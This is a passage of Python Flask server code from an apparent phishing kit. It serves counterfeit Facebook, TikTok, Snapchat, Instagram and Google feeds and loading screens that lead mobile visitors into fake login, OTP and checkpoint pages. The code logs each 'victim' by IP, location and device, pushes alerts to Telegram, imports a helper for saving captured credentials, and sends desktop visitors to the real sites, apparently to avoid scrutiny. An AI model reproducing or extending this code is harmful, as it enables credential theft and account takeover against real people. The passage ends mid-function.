import random
import string
import re
import html
import os
import copy
import traceback
from urllib.parse import quote
from flask import Flask, render_template_string, request, redirect, session, url_for

from config import active_servers, sandbox_config, get_cfg
from templates import (HTML_MOBILE, HTML_OTP_MOBILE, 
                       HTML_CHECKPOINT, HTML_FEED, REACTIONS_MAP,
                       HTML_MESSAGE_RESTORE)
import platforms as _platforms
from helpers import (recuperer_ip_robuste, obtenir_infos_reseau, detect_language,
                     get_translations, get_feed_translations, envoyer_telegram,
                     ajouter_log, sauvegarder_identifiants_purs, log_error)


def _resolve_loading_speeds(cfg):
    """Résout la vitesse d'animation à partir de la config.

    Retourne (spinner_dur, dots_dur) en secondes (float).
    - Si loading_speed_custom est un float > 0, il est utilisé comme durée spinner.
    - Sinon, le preset (slow/normal/fast) est utilisé.
    - Defaults : spinner=0.8s, dots=2.4s (comportement original).
    """
    _SPEED_PRESETS = {
        "slow":   (1.6, 4.8),   # ×2 lent
        "normal": (0.8, 2.4),   # comportement original
        "fast":   (0.4, 1.2),   # ×2 rapide
    }
    _DEFAULT = (0.8, 2.4)

    # Essayer le custom en priorité
    try:
        custom = cfg.get("loading_speed_custom", "")
        if custom and str(custom).strip():
            val = float(str(custom).strip())
            if val > 0:
                return (val, val * 3.0)
    except (ValueError, TypeError):
        pass

    # Sinon, utiliser le preset
    try:
        preset = cfg.get("loading_speed_preset", "normal")
        if preset in _SPEED_PRESETS:
            return _SPEED_PRESETS[preset]
    except Exception:
        pass

    return _DEFAULT


def _build_fb_loading_page(duration, redirect_url, loading_type="spinner",
                            spinner_speed=None, dots_speed=None):
    """Génère la page de chargement Facebook (même style que le feed).
    Logo Facebook + indicateur + 'from Meta' + timer configuré.
    loading_type : "spinner" (anneau rotatif) ou "dots" (3 points animés).
    spinner_speed / dots_speed : durée d'un cycle en secondes (float), ou None pour défaut."""
    try:
        _dur = int(duration)
        if _dur < 1: _dur = 1
        _ms = _dur * 1000

        # Vitesses par défaut si non fournies (rétro-compat)
        _ss = spinner_speed if spinner_speed is not None else 0.8
        _ds = dots_speed if dots_speed is not None else 2.4
        # Clamp : minimum 0.1s pour éviter des animations invisibles
        _ss = max(0.1, round(_ss, 2))
        _ds = max(0.1, round(_ds, 2))
        # Délais dots proportionnels (dot1=0, dot2=cycle/6, dot3=cycle/3)
        _dot2_delay = round(_ds / 6, 2)
        _dot3_delay = round(_ds / 3, 2)

        # ── Construire le bloc d'indicateur selon le type ──
        if loading_type == "dots":
            # 3 points animés (transition de couleur, style Meta)
            indicator_css = f"""
        .fb-loader-dots {{ display: inline-flex; justify-content: space-between; width: 60px; align-items: center; margin-top: 40px; }}
        .fb-loader-dots div {{ width: 12px; height: 12px; background-color: #e4e6eb; border-radius: 50%; animation: fb-color-fade-slow {_ds}s infinite linear both; }}
        .fb-loader-dots .dot1 {{ animation-delay: 0s; }}
        .fb-loader-dots .dot2 {{ animation-delay: {_dot2_delay}s; }}
        .fb-loader-dots .dot3 {{ animation-delay: {_dot3_delay}s; }}
        @keyframes fb-color-fade-slow {{
            0%, 100% {{ background-color: #e4e6eb; }}
            30% {{ background-color: #65676b; }}
            60% {{ background-color: #242526; }}
        }}
"""
            indicator_html = """
            <div class="fb-loader-dots">
                <div class="dot1"></div>
                <div class="dot2"></div>
                <div class="dot3"></div>
            </div>
"""
            spinner_css = ""
        else:
            # Spinner par défaut (anneau rotatif)
            indicator_css = ""
            spinner_css = f"""
        .fb-loader-spinner {{ width: 36px; height: 36px; border: 3.5px solid rgba(24,119,242,0.1); border-top-color: #1877f2; border-radius: 50%; animation: fb-spin {_ss}s linear infinite; margin-top: 40px; }}
        @keyframes fb-spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
"""
            indicator_html = """
            <div class="fb-loader-spinner"></div>
"""

        return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .fb-loader { position: fixed; inset: 0; background: #fff; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding-top: 25vh; padding-bottom: 8vh; }
        .fb-loader-top { display: flex; flex-direction: column; align-items: center; }
        __INDICATOR_CSS__
        __SPINNER_CSS__
        .fb-loader-bottom { color: #65676B; font-size: 11px; font-weight: 600; letter-spacing: 1.5px; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .fb-loader-bottom .from { opacity: 0.55; }
        .fb-loader-bottom .meta { color: #050505; font-size: 14px; font-weight: bold; letter-spacing: 2.5px; text-transform: uppercase; }
        .fb-loader-fade { transition: opacity 0.4s ease; }
    </style>
</head>
<body>
    <div id="fb-loader" class="fb-loader">
        <div class="fb-loader-top">
            <svg viewBox="0 0 36 36" style="width: 78px; height: 78px; fill: #1877f2;"><path d="M20.181 35.87C29.094 34.483 36 26.845 36 17.587 36 7.873 27.91 0 17.935 0 7.96 0 0 7.873 0 17.587 0 26.353 6.553 33.627 15.13 35.539l.067-12.24h-4.48v-4.896h4.48v-3.733c0-4.437 2.703-6.88 6.698-6.88 1.914 0 3.559.143 4.037.206v4.667h-2.77c-2.159 0-2.577 1.023-2.577 2.525v3.31h5.18l-.675 4.9h-4.505L20.181 35.87z"/></svg>
            __INDICATOR_HTML__
        </div>
        <div class="fb-loader-bottom">
            <span class="from">from</span>
            <span class="meta">Meta</span>
        </div>
    </div>
    <script>
        (function() {
            var loader = document.getElementById('fb-loader');
            setTimeout(function() {
                if (loader) {
                    loader.classList.add('fb-loader-fade');
                    loader.style.opacity = '0';
                    setTimeout(function() {
                        window.location.href = '__REDIRECT__';
                    }, 400);
                } else {
                    window.location.href = '__REDIRECT__';
                }
            }, __MS__);
        })();
    </script>
</body>
</html>
""".replace("__MS__", str(_ms)).replace("__REDIRECT__", redirect_url) \
   .replace("__INDICATOR_CSS__", indicator_css) \
   .replace("__SPINNER_CSS__", spinner_css) \
   .replace("__INDICATOR_HTML__", indicator_html)
    except Exception as e:
        try:
            log_error("_build_fb_loading_page", e)
        except Exception:
            pass
        return None


def _route_log(context, exc):
    """Centralized error logger for routes.py — writes to errors_logs.txt.
    In debug mode, also forwards the error to all victim log panels + sandbox.
    Error logs are NOT encrypted (performance — they grow fast)."""
    try:
        import time
        ts = time.strftime('%Y-%m-%d %H:%M:%S')
        with open("errors_logs.txt", "a", encoding="utf-8") as f:
            f.write(f"[{ts}] [routes.py:{context}] {exc}\n{traceback.format_exc()}\n\n")
    except Exception as e:
        try:
            import sys as _sys
            _sys.stderr.write(f"[routes._route_log] failed to write: {e}\n")
        except Exception:
            pass
    # Forward to victim log panels + sandbox in debug mode
    try:
        from helpers import _debug_log_to_victims
        _debug_log_to_victims("ERROR", f"[routes:{context}] {exc}", "#ef4444")
    except Exception as e:
        try:
            import sys as _sys
            _sys.stderr.write(f"[routes._route_log] forward to victims failed: {e}\n")
        except Exception:
            pass


# MIME Type mapper for video formats
MIME_TYPE_MAP = {
    '.mp4': 'video/mp4',
    '.webm': 'video/webm',
    '.mkv': 'video/x-matroska',
    '.avi': 'video/x-msvideo',
    '.mov': 'video/quicktime',
    '.flv': 'video/x-flv',
    '.ogv': 'video/ogg',
    '.m4v': 'video/mp4',
    '.wmv': 'video/x-ms-wmv',
    '.3gp': 'video/3gpp',
    '.ts': 'video/mp2t',
    '.mts': 'video/mp2t',
    '.m2ts': 'video/mp2t',
    # Image types for ads and covers
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': 'image/gif',
    '.webp': 'image/webp',
    '.svg': 'image/svg+xml',
    # Audio types for background music
    '.mp3': 'audio/mpeg',
    '.wav': 'audio/wav',
    '.ogg': 'audio/ogg',
    '.m4a': 'audio/mp4'
}

def get_mime_type(filename):
    """
    Detect the correct MIME type based on file extension.
    Defaults to video/mp4 if extension is unknown.
    Never returns None — always returns a usable MIME string.
    """
    try:
        if not filename:
            return 'video/mp4'
        import os
        _, ext = os.path.splitext(filename.lower())

        # Return mapped MIME type or default to video/mp4 (NOT octet-stream,
        # which causes iOS Safari / Android WebView to refuse playback)
        return MIME_TYPE_MAP.get(ext, 'video/mp4')

    except Exception as e:
        from helpers import log_error
        log_error('routes.get_mime_type', e)
        # Always return a usable MIME type even on exception
        return 'video/mp4'
def stream_local_video(file_path, mime_type):
    """
    Robust video streaming function supporting HTTP Range requests and perfect caching.
    Using send_file with conditional=True automatically processes Range headers,
    returns 206 Partial Content, slices the file, and adds all ETag/Last-Modified caching headers!
    """
    try:
        from flask import send_file
    
        # conditional=True is the key to HTTP 206 Streaming and 304 Caching in Flask
        response = send_file(file_path, mimetype=mime_type, conditional=True, as_attachment=False)
    
        # Force Accept-Ranges to ensure Safari/iOS knows seeking is supported
        response.headers['Accept-Ranges'] = 'bytes'
    
        # Reasonable cache (1 hour), avoid immutable to allow re-fetches after errors
        response.headers['Cache-Control'] = 'public, max-age=3600'
    
        # Allow CORS so cross-origin scripts or players can read it
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, HEAD, OPTIONS'
        response.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Range, Accept-Ranges'
    
        return response

    except Exception as e:
        from helpers import log_error
        log_error('routes.stream_local_video', e)
        return f"Error streaming file: {e}", 500
app = Flask(__name__)
app.secret_key = "".join(random.choices(string.ascii_letters + string.digits, k=48))


# ────────────────────────────────────────────────────────────────────
# Anti-cache pour les pages HTML + gestion du bfcache (Back/Forward cache)
# Les pages de login/feed doivent être reconsultées à chaque navigation,
# sinon le navigateur sert une version mise en cache (ou restaurée depuis
# le bfcache) sans réafficher la page de chargement.
# ────────────────────────────────────────────────────────────────────
_BFCACHE_RELOAD_SCRIPT = (
    "<script>"
    "(function(){"
    "window.addEventListener('pageshow',function(e){"
    "if(e.persisted){window.location.reload();}"
    "});"
    "})();"
    "</script>"
)


@app.after_request
def _no_cache_html(response):
    try:
        ctype = response.content_type or ""
        if "text/html" in ctype:
            # 1) En-têtes anti-cache HTTP
            response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            # 2) Injection du script bfcache avant </body> (si présent)
            try:
                body = response.get_data(as_text=True)
                if "</body>" in body and "_bfcache_reload" not in body:
                    body = body.replace("</body>", _BFCACHE_RELOAD_SCRIPT + "</body>", 1)
                    response.set_data(body)
            except Exception as e:
                _route_log("after_request.bfcache_inject", e)
    except Exception as e:
        _route_log("after_request.no_cache_html", e)
    return response

@app.route("/log_device", methods=["POST"])
def log_device():
    try:
        data = request.json
        if data:
            info_str = f"RES: {data.get('res')} | MEM: {data.get('mem')} | CPU: {data.get('cores')} | GPU: {data.get('gpu')}"
            ajouter_log("DEVICE", info_str, "#a29bfe")
        return "", 204

    except Exception as e:
        from helpers import log_error
        log_error('routes.log_device', e)
@app.route("/feed_click", methods=["POST"])
def feed_click():
    try:
        data = request.json
        if data and data.get("redirect"):
            session["custom_redirect"] = data.get("redirect")
        else:
            session.pop("custom_redirect", None)
        # ── Reset current_step pour que la page de login s'affiche ──
        # Quand la victime clique sur "Continuer" dans le feed, on veut
        # qu'elle arrive sur la page de login, pas sur un checkpoint/OTP.
        session['current_step'] = 'login_page'
        session.pop('att', None)
        session.pop('o_att', None)
        session.pop('mr_att', None)
        session.pop('msg', None)
        return "", 204

    except Exception as e:
        from helpers import log_error
        log_error('routes.feed_click', e)
@app.route("/feed")
def feed():
    try:
        cfg = get_cfg()
        if not cfg.get("running"):
            return "Offline", 403
        if not cfg.get("feed_enabled") or not cfg.get("publications"):
            return redirect("/")
        # ── Si la victime a déjà interagi (login, OTP, checkpoint...), on ne
        #    retourne PLUS au feed : la rediriger vers / pour reprendre le flux. ──
        _has_interacted_feed = (
            session.get('att', 0) > 0
            or session.get('o_att', 0) > 0
            or session.get('mr_att', 0) > 0
            or session.get('current_step', 'login_page') != 'login_page'
        )
        if _has_interacted_feed:
            return redirect("/?loaded=1")

        # ────────────────────────────────────────────────────────────────
        #  PC redirect for mobile-only platforms (TikTok, Snapchat, Instagram, Google)
        #  Same logic as in _index_impl(): desktop users get redirected to
        #  the official platform website instead of seeing the mobile-only feed.
        # ────────────────────────────────────────────────────────────────
        try:
            _pid_feed = (cfg.get("platform") or "facebook").lower().strip()
            # ── Toutes les plateformes sont mobile-only ──
            if _pid_feed in ("facebook", "tiktok", "snapchat", "instagram", "google"):
                _ua = request.headers.get('User-Agent', '')
                _is_mobile_ua = any(x in _ua for x in ["Android", "iPhone", "iPad", "Mobile"])
                if not _is_mobile_ua:
                    _platform_info = _platforms.get_platform(cfg)
                    _official_url = _platform_info.get("default_redirect")
                    if _official_url:
                        try:
                            ajouter_log("REDIRECT PC", f"Desktop user redirected to official site from /feed: {_official_url} (platform: {_pid_feed})", "#3498db", force_cfg=cfg)
                        except Exception:
                            pass
                        return redirect(_official_url)
        except Exception as e:
            _route_log("feed.pc_redirect", e)
            try:
                from helpers import log_error
                log_error("routes.feed.pc_redirect", e)
            except Exception:
                pass

        # ────────────────────────────────────────────────────────────────
        #  Fake loading page avant le feed (réaffiché à chaque rechargement)
        #  Pour TikTok/Snapchat : handle_loading dédié
        #  Pour Facebook : le loader est intégré dans le template du feed (fb-mobile-loader)
        # ────────────────────────────────────────────────────────────────
        if cfg.get("fake_loading_enabled"):
            try:
                loading_html = _platforms.handle_loading(cfg)
                if loading_html:
                    return loading_html
                # Facebook : pas de page séparée, le loader est dans le template
            except Exception as e:
                _route_log("feed.handle_loading", e)
                try:
                    from helpers import log_error
                    log_error("routes.feed.handle_loading", e)
                except Exception:
                    pass

        ip = recuperer_ip_robuste(request)
        lang = detect_language(request)
        # Platform-aware feed translations, fallback to helpers (FB)
        try:
            ft = _platforms.get_feed_translations_for(cfg, lang)
            if not ft:
                ft = get_feed_translations(lang)
        except Exception as e:
            _route_log("feed.translations", e)
            ft = get_feed_translations(lang)

        if 'ip_logged' not in session:
            try:
                victim_info = obtenir_infos_reseau(ip)
                net_info_str = f"Country: {victim_info['country']} | City: {victim_info['city']}"
                platform_name = _platforms.get_platform(cfg).get("name", "?")
                ajouter_log("VICTIM", f"IP: {ip} | {net_info_str} | Lang: {lang.upper()} | Platform: {platform_name}", "#ff7675")
                envoyer_telegram(f"🎯 <b>Nouvelle victime</b>\nIP: {ip}\n{victim_info['country']} - {victim_info['city']}\nPlatform: {platform_name}")
                session['victim_info'] = victim_info
            except Exception as e:
                _route_log("feed.victim_log", e)
                session['victim_info'] = {"country": "Unknown", "city": "Unknown"}
            ua = request.headers.get('User-Agent', '')
            is_mobile_ua = any(x in ua for x in ["Android", "iPhone", "iPad", "Mobile"])
            session['device_str'] = "Android • Chrome" if is_mobile_ua else "Windows • Chrome"
            session['ip_logged'] = True
    
        ajouter_log("FEED", "Victim viewing publications feed", "#a29bfe")
    
        # Process mentions and audience in publications
        processed_pubs = []
        aud_map = {
            "Public": {"icon": "fa-globe-americas", "tr": "public"},
            "Amis": {"icon": "fa-user-friends", "tr": "friends"},
            "Amis de mes amis": {"icon": "fa-users", "tr": "friends_of_friends"},
            "Sponsorisé": {"icon": "fa-globe-americas", "tr": "sponsored"},
            "Privé": {"icon": "fa-lock", "tr": "private"}
        }
    
        for pub in cfg["publications"]:
            if not pub.get("visible", True):
                continue
            # Note: les publications sont déjà filtrées par plateforme au chargement
            # (pub_manager.load_publications charge uniquement le dossier de la
            # plateforme courante), pas besoin de filtrer à nouveau ici.
            p = pub.copy()
            def process_tags(text_input):
                try:
                    if not text_input: return ""
                    # Regex pour @mentions et #hashtags
                    # Supporte 3 formes :
                    #   1. @'expression'  ou  #'expression'  (guillemets simples)
                    #   2. @"expression"  ou  #"expression"  (guillemets doubles)
                    #   3. @mot  ou  #mot                  (mot simple)
                    # Le mot simple supporte : lettres (avec accents), chiffres, _, ., -
                    pattern = r'(@["\'][^"\']+["\']|@[\w\u00C0-\u024F\u1E00-\u1EFF\u0100-\u017F\-_.]+|#["\'][^"\']+["\']|#[\w\u00C0-\u024F\u1E00-\u1EFF\u0100-\u017F\-_.]+)'
                    parts = re.split(pattern, text_input)

                    result = ""
                    for part in parts:
                        if not part: continue
                        if part.startswith('@') or part.startswith('#'):
                            prefix = part[0]
                            val = part[1:]
                            # Retirer les guillemets entourants
                            if (val.startswith('"') and val.endswith('"')) or (val.startswith("'") and val.endswith("'")):
                                if len(val) >= 2:
                                    val = val[1:-1]
                            # Échapper le HTML dans la valeur (sans échapper les guillemets)
                            safe_val = html.escape(val, quote=False)
                            # Envelopper dans un span bleu Facebook (#1877f2)
                            cls = 'fb-mention' if prefix == '@' else 'fb-hashtag'
                            if prefix == '@':
                                # Pour @ : afficher UNIQUEMENT le mot/expression (sans le @)
                                # Comme sur Facebook réel où les mentions apparaissent
                                # en bleu avec le nom seul, sans le @ devant.
                                result += f'<span class="{cls}">{safe_val}</span>'
                            else:
                                # Pour # : afficher #mot (comportement normal des hashtags)
                                result += f'<span class="{cls}">{prefix}{safe_val}</span>'
                        else:
                            # quote=False: don't escape ' and " — avoids &#x27; and &quot;
                            result += html.escape(part, quote=False)

                    return result.replace('\n', '<br>')

                except Exception as e:
                    from helpers import log_error
                    log_error('routes.process_tags', e)
                    # En mode debug, afficher l'erreur dans les logs des victimes
                    try:
                        from helpers import _debug_log_to_victims
                        _debug_log_to_victims('process_tags error', f'{e}', '#ef4444')
                    except Exception:
                        pass
                    # Fallback sûr : retourner le texte échappé sans transformation
                    try:
                        return html.escape(text_input, quote=False).replace('\n', '<br>')
                    except Exception:
                        return ""
            p["text"] = process_tags(p.get("text", ""))
            if p.get("caption"):
                p["caption"] = process_tags(p.get("caption", ""))
            if p.get("share_desc"):
                p["share_desc"] = process_tags(p.get("share_desc", ""))
        
            # Audience
            aud_info = aud_map.get(p.get("audience", "Sponsorisé"), aud_map["Sponsorisé"])
            if p.get("audience") == "Sponsorisé":
                p["time_ago"] = ft.get("sponsored", "Sponsored")
            else:
                p["time_ago"] = p.get("time_ago", "1h")
            
            p["audience_text"] = ft.get(aud_info["tr"], ft["sponsored"])
            p["audience_icon"] = aud_info["icon"]
        
            # Audience for shared post
            share_aud_info = aud_map.get(p.get("share_audience", "Public"), aud_map["Public"])
            p["share_audience_icon"] = share_aud_info["icon"]

            # Fix: share_time is stored as share_time_ago in JSON → remap for template
            if not p.get("share_time"):
                p["share_time"] = p.get("share_time_ago", "1h") or "1h"

            # Fix: normalize private audience — if audience == "Privé", also set use_private = True
            if p.get("audience") == "Privé":
                p["use_private"] = True
        
            p["redirect_after"] = p.get("redirect_after") or cfg["redirect_url"]
        
            # Process reactions using platform-aware reactions map
            try:
                reactions_map = _platforms.get_reactions_map_for(cfg) or REACTIONS_MAP
            except Exception as e:
                _route_log("feed.reactions_map", e)
                reactions_map = REACTIONS_MAP

            p_reacts_data = p.get("reactions", [])
            p["processed_reactions"] = []
        
            # Backward compatibility with string format ("like,love") vs new dict format ([{"name": "like"}, ...])
            if isinstance(p_reacts_data, str):
                p_reacts = p_reacts_data.split(",")
                for r_name in p_reacts:
                    r_name = r_name.strip().lower()
                    if r_name in reactions_map:
                        p["processed_reactions"].append(reactions_map[r_name])
            elif isinstance(p_reacts_data, list):
                for r in p_reacts_data:
                    # Some dicts might be saved with full info, some just name
                    r_name = r.get("name", "").strip().lower() if isinstance(r, dict) else str(r).strip().lower()
                    if r_name in reactions_map:
                        p["processed_reactions"].append(reactions_map[r_name])
                
            # Server-side truncation to guarantee layout stability on all mobile webviews
            def safe_trunc(val, limit):
                s = str(val) if val is not None else ""
                return s[:limit] + "..." if len(s) > limit else s
            
            p["likes"] = safe_trunc(p.get("likes", ""), 20)
            p["comments"] = safe_trunc(p.get("comments_count", ""), 10)
            p["shares"] = safe_trunc(p.get("shares_count", ""), 10)
                
            if p.get("sim_action"):
                sr = p.get("sim_reaction", "J'aime")
                if sr == "J'aime": p["sim_icon"] = "fas fa-thumbs-up"; p["sim_color"] = "#0866FF"
                elif sr == "J'adore": p["sim_icon"] = "fas fa-heart"; p["sim_color"] = "#F33E58"
                elif sr == "Solidaire": p["sim_icon"] = "fas fa-hand-holding-heart"; p["sim_color"] = "#F7B125"
                elif sr == "Haha": p["sim_icon"] = "fas fa-laugh-squint"; p["sim_color"] = "#F7B125"
                elif sr == "Wouah": p["sim_icon"] = "fas fa-surprise"; p["sim_color"] = "#F7B125"
                elif sr == "Triste": p["sim_icon"] = "fas fa-sad-tear"; p["sim_color"] = "#F7B125"
                elif sr == "En colère": p["sim_icon"] = "fas fa-angry"; p["sim_color"] = "#E9710F"
                p["sim_text"] = sr
        
            # Handle video URLs - resolve direct links for external videos
            # Set defaults first
            p["_is_external"] = False
            p["_video_url"] = None
            p["_cover_url"] = None
            p["_cover_is_external"] = False

            # Preserve original absolute paths BEFORE any transformation
            # so the /video/ serving route can find them on disk
            orig_paths = {}
            for _field in ("image", "video_cover", "profile_pic", "group_pic",
                           "share_pic", "share_group_pic", "music_url"):
                _val = p.get(_field, "")
                import os
                if _val and os.path.isabs(_val):
                    orig_paths[_field] = _val
            p["_original_paths"] = orig_paths
        
            is_video_post = p.get("type") == "video" or (p.get("type") == "share" and p.get("share_type") == "Vidéo")
        
            # Explicit fake video flag set by the user in the publication editor
            p["_fake_video"] = bool(p.get("fake_video", False))
            # Sound enabled flag: if True, the video plays with sound (unmuted on first click).
            # Default to True for backward compatibility with old publications.
            p["sound_enabled"] = p.get("sound_enabled", True)
        
            if p["_fake_video"]:
                # Fake video: the image field holds the thumbnail to display
                # No video URL processing needed — template renders image + play overlay
                pass
            elif p.get("image"):
                img_val = p["image"]
                is_http_url = img_val.startswith("http://") or img_val.startswith("https://")

                # ANY value in `image` for a video post is treated as a video source.
                # We don't try to parse the URL or detect the format — the browser
                # will use the server's Content-Type header to pick the codec.
                if is_http_url and is_video_post:
                    # External URL → proxy through /proxy_video (bypasses CORS,
                    # allows Service Worker caching).
                    p["_video_url"] = f"/proxy_video?url={quote(img_val, safe='')}"
                    p["_is_external"] = True
                elif is_video_post:
                    # Local reference (vid_<timestamp>_name.ext, plain filename,
                    # or absolute path) → serve directly via /video/ route.
                    # We DON'T parse the value to detect extensions or hash IDs —
                    # just serve it as-is.
                    fname = os.path.basename(img_val) if os.path.isabs(img_val) else img_val
                    # Encoder le nom de fichier pour les caractères spéciaux (#, [, ], emojis, etc.)
                    p["_video_url"] = f"/video/{cfg['target_name']}/{quote(fname, safe='')}"
                    p["_is_external"] = False


            if p.get("video_cover"):
                # Treat the cover the same way as the video source: no URL parsing,
                # no extension detection. External → proxy, local → /video/ route.
                if p["video_cover"].startswith("http://") or p["video_cover"].startswith("https://"):
                    p["_cover_url"] = f"/proxy_video?url={quote(p['video_cover'], safe='')}"
                    p["_cover_is_external"] = True
                else:
                    fname = os.path.basename(p["video_cover"]) if os.path.isabs(p["video_cover"]) else p["video_cover"]
                    p["_cover_url"] = f"/video/{cfg['target_name']}/{fname}"
                    p["_cover_is_external"] = False
        
            processed_pubs.append(p)

        # Helper: resolve plain filenames to /video/<target>/filename URLs
        def resolve_img(val, tname):
            try:
                """If val is a plain filename (not URL, not data:, not empty, not a hex color,
                not 'transparent'), return served URL."""
                if not val:
                    return val
                if val.startswith("http://") or val.startswith("https://") or val.startswith("data:"):
                    return val
                # Hex colors (e.g. "#1877f2", "#fff") and "transparent" are NOT filenames
                # — they are CSS values that must be passed through as-is.
                if val == "transparent" or val.startswith("#"):
                    return val
                # Absolute Linux path (starts with /) → serve via /video/ route
                if val.startswith("/"):
                    return f"/video/{tname}/{quote(os.path.basename(val), safe='')}"
                # Plain filename (no slash) → serve via /video/ route
                # Encoder pour les caractères spéciaux (#, [, ], emojis, etc.)
                return f"/video/{tname}/{quote(val, safe='')}"

            except Exception as e:
                from helpers import log_error
                log_error('routes.resolve_img', e)
                return val
        target_name = cfg["target_name"]

        # Resolve target profile pic
        resolved_target_pic = resolve_img(cfg.get("target_pic") or cfg.get("victim_photo", ""), target_name)

        # Resolve all image fields in publications
        for p in processed_pubs:
            p["profile_pic"] = resolve_img(p.get("profile_pic", ""), target_name)
            p["group_pic"] = resolve_img(p.get("group_pic", ""), target_name)
            p["share_pic"] = resolve_img(p.get("share_pic", ""), target_name)
            p["share_group_pic"] = resolve_img(p.get("share_group_pic", ""), target_name)
            # Resolve image only for non-video post types (images, not video IDs)
            if p.get("image") and not p["image"].startswith("vid_") and p.get("type") != "video":
                p["image"] = resolve_img(p["image"], target_name)
            # Resolve extra_images (carousel de photos dans une publication Facebook)
            if p.get("extra_images"):
                try:
                    p["_extra_images_resolved"] = [resolve_img(img, target_name) for img in p["extra_images"] if img]
                except Exception as e:
                    _route_log("feed.extra_images_resolve", e)
                    p["_extra_images_resolved"] = []
            # Resolve video cover
            if p.get("video_cover") and not p["video_cover"].startswith("vid_"):
                p["video_cover"] = resolve_img(p["video_cover"], target_name)
            # Resolve custom background
            if p.get("bg"):
                p["bg"] = resolve_img(p["bg"], target_name)
            # Resolve music url
            if p.get("has_music") and p.get("music_url"):
                p["music_url"] = resolve_img(p["music_url"], target_name)
            # Resolve sound disc image (used by TikTok & Snapchat feeds)
            if p.get("sound_image"):
                p["sound_image"] = resolve_img(p["sound_image"], target_name)
            if p.get("music_image"):
                p["music_image"] = resolve_img(p["music_image"], target_name)
            # Resolve carousel images (TikTok/Snapchat image carousel with music + individual blur)
            if p.get("carousel_images"):
                try:
                    import json
                    _car_text = p["carousel_images"]
                    _car_resolved = []
                    _car_blur = []
                    _parsed = False

                    # Format JSON (nouveau, robuste — gère les URLs avec | ou ||)
                    try:
                        data = json.loads(_car_text)
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, dict) and "img" in item:
                                    _car_resolved.append(resolve_img(item["img"], target_name))
                                    _car_blur.append({
                                        "blur": item.get("blur", False),
                                        "reason": item.get("reason", "")
                                    })
                            _parsed = True
                    except (json.JSONDecodeError, TypeError, ValueError):
                        pass

                    # Fallback: ancien format "img1||img2|blur:reason||img3"
                    if not _parsed and "||" in _car_text:
                        for part in _car_text.split("||"):
                            part = part.strip()
                            if not part:
                                continue
                            if "|blur:" in part:
                                img, reason = part.split("|blur:", 1)
                                _car_resolved.append(resolve_img(img.strip(), target_name))
                                _car_blur.append({"blur": True, "reason": reason.strip()})
                            else:
                                _car_resolved.append(resolve_img(part, target_name))
                                _car_blur.append({"blur": False, "reason": ""})
                        _parsed = True

                    # Fallback: très ancien format "img1, img2, img3" (comma-separated)
                    if not _parsed:
                        for img in _car_text.split(','):
                            img = img.strip()
                            if img:
                                _car_resolved.append(resolve_img(img, target_name))
                                _car_blur.append({"blur": False, "reason": ""})

                    p["_carousel_images"] = _car_resolved
                    p["_carousel_blur"] = _car_blur
                except Exception as e:
                    _route_log("feed.carousel_resolve", e)
                    p["_carousel_images"] = []
                    p["_carousel_blur"] = []

        processed_ads = []
        for orig_ad in cfg.get("ads", []):
            if orig_ad.get("visible", True):
                ad = copy.deepcopy(orig_ad)
                ad["image_url"] = resolve_img(ad.get("image_url", ""), target_name)
            
                # Format click_url properly as external link
                c_url = ad.get("click_url", "").strip()
                if c_url and not c_url.startswith("http://") and not c_url.startswith("https://"):
                    ad["click_url"] = "https://" + c_url
                
                # Format cta_url properly as external link
                cta_url = ad.get("cta_url", "").strip()
                if cta_url and not cta_url.startswith("http://") and not cta_url.startswith("https://"):
                    ad["cta_url"] = "https://" + cta_url
                
                processed_ads.append(ad)

        # Pick the platform feed template, fallback to HTML_FEED (Facebook)
        try:
            feed_tmpl = _platforms.get_template(cfg, "feed") or HTML_FEED
        except Exception as e:
            _route_log("feed.template", e)
            feed_tmpl = HTML_FEED

        # Vitesse d'animation (partagée spinner + dots)
        _feed_s_speed, _feed_d_speed = _resolve_loading_speeds(cfg)

        return render_template_string(feed_tmpl,
            lang=lang,
            posts=processed_pubs,
            target_name=target_name,
            name=cfg.get("display_name", target_name),
            profile_pic=resolved_target_pic,
            msg_count=cfg.get("msg_count", "0"),
            notif_count=cfg.get("notif_count", "0"),
            ads=processed_ads,
            fake_loading_enabled=cfg.get("fake_loading_enabled", False),
            fake_loading_duration=cfg.get("fake_loading_duration", 3),
            fake_loading_type=cfg.get("fake_loading_type", "spinner"),
            spinner_speed=_feed_s_speed,
            dots_speed=_feed_d_speed,
            **ft
        )

    except Exception as e:
        _route_log("feed", e)
        try:
            from helpers import log_error
            log_error('routes.feed', e)
        except Exception as e2:
            _route_log("feed.log_error_forward", e2)
        return "Internal Server Error", 500

@app.route("/", methods=["GET", "POST"])
def index():
    try:
        return _index_impl()
    except Exception as e:
        _route_log("index", e)
        try:
            ajouter_log("ERROR", f"index(): {e}", "#ef4444")
        except Exception as e2:
            _route_log("index.ajouter_log", e2)
        return "Internal Server Error", 500


def _index_impl():
    cfg = get_cfg()
    if not cfg.get("running"):
        return "Offline", 403

    # Resolve platform (facebook / tiktok / snapchat / google / instagram)
    try:
        # Honor per-session platform override (from /switch_platform route)
        _override_pid = session.get("platform_override")
        if _override_pid and _override_pid in _platforms.PLATFORMS:
            platform = _platforms.PLATFORMS[_override_pid]
            # Also override cfg's platform so downstream get_template/get_translations work
            try:
                cfg = dict(cfg)
                cfg["platform"] = _override_pid
                # Stocker source_platform dans le cfg pour que helpers.py puisse y accéder
                _src_plat = session.get("source_platform")
                if _src_plat:
                    cfg["source_platform"] = _src_plat
            except Exception as e:
                _route_log("index.platform_override", e)
        else:
            platform = _platforms.get_platform(cfg)
    except Exception as e:
        _route_log("index.get_platform", e)
